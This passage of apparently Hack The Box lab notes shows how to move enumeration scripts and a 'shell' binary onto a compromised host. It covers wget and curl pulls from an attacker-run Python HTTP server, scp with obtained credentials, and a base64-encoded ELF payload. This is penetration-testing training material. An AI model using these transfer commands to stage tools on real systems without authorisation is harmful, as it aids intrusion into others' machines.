- transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host.

## Using wget
One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host.

```shell-session
CaraxesL@htb[/htb]$ cd /tmp
CaraxesL@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
```

or
```shell-session
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## Using SCP
granted we have obtained ssh user credentials on the remote host. We can do so as follows:
```shell-session
 scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```
Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`

## Using Base64
we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it

```shell-session
 base64 shell -w 0
```
Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```
## Validating File Transfers

```shell-session
user@remotehost$ file shell
```
when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it.

To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
```shell-session
md5sum shell
```
